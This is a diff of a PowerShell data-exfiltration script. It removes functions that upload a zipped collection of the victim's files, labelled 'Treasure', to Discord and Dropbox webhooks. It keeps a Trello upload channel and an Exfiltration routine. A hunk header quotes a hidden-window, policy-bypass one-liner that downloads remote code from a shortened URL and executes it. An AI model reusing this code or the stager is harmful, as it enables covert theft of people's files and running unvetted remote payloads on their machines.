@@ -27,11 +27,6 @@ powershell -w h -NoP -Ep Bypass ;irm https://shorturl.at/gpvF5 | iex
 
 #>
 
-# Delete the "#" before dc or db variables to redirect to the discord/dropbox webhook
-# $dc=''
-# $db=''
-#
-# TRELLO : 
 # You need to changes those variables in the Upload-Trello function : 
 #$idList = ""
 #$key = ""
@@ -60,51 +55,6 @@ function TempDir {
 }
 
 
-
-function Upload-Dropbox {
-
-[CmdletBinding()]
-param (
-    
-[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
-[Alias("f")]
-[string]$SourceFilePath
-) 
-$outputFile = Split-Path $SourceFilePath -leaf
-$TargetFilePath="/$outputFile"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
-
-
-#Function to upload to discord
-function Upload-Discord {
-    [CmdletBinding()]
-    param (
-        [parameter(Position=0,Mandatory=$False)]
-        [string]$file,
-        [parameter(Position=1,Mandatory=$False)]
-        [string]$text 
-    )
-
-    $Body = @{
-        'username' = $env:username
-        'content' = $text
-    }
-
-    if (-not ([string]::IsNullOrEmpty($text))){
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc -Method Post -Body ($Body | ConvertTo-Json)
-    }
-
-    if (-not ([string]::IsNullOrEmpty($file))){
-        curl.exe -F "file1=@$file" $dc
-    }
-}
 
 # Specify the username
 $username = $env:username
@@ -200,12 +150,6 @@ function Exfiltration {
 
     #Call ZipFiles
     ZipFiles
-
-    # Call Upload-Discord
-    Upload-Discord -file $zipFilePath -text "Treasure :"
-
-    # Call Upload-Dropbox
-    Upload-Dropbox -SourceFilePath $zipFilePath
 
     #Call Upload-Trello
     Upload-Trello
